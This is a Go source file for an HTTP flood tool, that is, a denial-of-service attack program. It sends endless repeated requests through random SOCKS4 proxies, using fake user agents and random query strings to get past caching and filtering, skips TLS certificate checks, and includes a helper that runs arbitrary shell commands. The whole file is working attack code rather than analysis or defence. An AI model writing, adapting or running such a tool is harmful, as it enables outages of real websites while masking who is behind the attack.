package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
	"github.com/gamexg/proxyclient"
	"github.com/valyala/fasthttp"
)

// Returns an array of User-agent
func getUserAgents(number int) []string {
	ua := make([]string, number)

	for i := range ua {
		ua[i] = browser.Random()
	}

	return ua
}

// Returns a random element in the []string
func random(seeds []string) string {
	return seeds[rand.Intn(len(seeds))]
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}

	return string(s)
}

func randomParam() string {
	return fmt.Sprintf("?%s=%s", randomString(5), randomString(50))
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

func handle(host, port, method, path, useragent, proxy string, n int) {
	var conn net.Conn

	var h fasthttp.RequestHeader
	h.SetRequestURI(path + randomParam())
	h.SetMethod(method)
	h.SetHost(host)
	h.SetUserAgent(useragent)
	header := []byte(h.String())

	// Dialer
	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)

	if err != nil {
		return
	}

	// Connect
	conn, err = dialer.DialTimeout("tcp", fmt.Sprintf("%s:%s", host, port), 5*time.Second)

	if err != nil {
		return
	}

	if port == "443" {
		conn = tls.Client(conn, &tls.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
		})
	}

	defer conn.Close()
	for i := 0; i < n; i++ {
		conn.Write(header)
	}
}

func flood(host, port, method, path string, useragents, proxies []string) {
	for {
		handle(host, port, method, path, random(useragents), random(proxies), 100)
	}
}

func runCommand(command string) {
	exec.Command("sh", "-c", command).Run()
}
